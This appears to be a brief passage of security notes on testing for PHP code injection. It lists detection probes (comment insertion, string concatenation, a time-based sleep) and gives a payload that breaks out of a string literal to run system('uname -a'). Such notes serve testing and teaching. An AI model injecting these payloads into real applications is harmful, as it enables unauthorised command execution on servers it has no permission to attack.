
## Few ways you can test for it
- Using comments and injecting `/*random value*/ random value`
- With string concentration: `"."ha"."cker`
- Time based: `sleep(10)`

## PHP exploit example
- so now we have to concentrate the default string with a command like so
```php
".system('uname -a'); $dummy="
```



